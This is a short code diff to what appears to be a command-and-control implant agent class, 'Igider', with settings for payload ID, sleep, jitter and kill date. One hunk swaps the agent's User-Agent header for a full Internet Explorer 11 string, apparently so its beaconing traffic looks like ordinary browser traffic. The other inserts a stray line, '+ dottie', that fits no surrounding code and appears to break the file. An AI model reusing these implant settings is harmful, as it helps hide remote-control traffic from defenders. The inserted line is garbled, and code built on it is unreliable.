@@ -86,6 +86,7 @@ class Igider:
                     if task.get("error"):
                         out["status"] = "error"
                     responses.append(out)
+ dottie
             if responses:
                 message = {"action": "post_response", "responses": responses}
                 response_data = self.postMessageAndRetrieveResponse(message)
@@ -228,7 +229,7 @@ class Igider:
             "GetParam": "query_path_name",
             "PayloadUUID": "UUID_HERE",
             "UUID": "",
-            "Headers": {"User-Agent": "Mozilla/5.0"},
+            "Headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
             "Sleep": 5,
             "Jitter": 10,
             "KillDate": "9999-12-31"
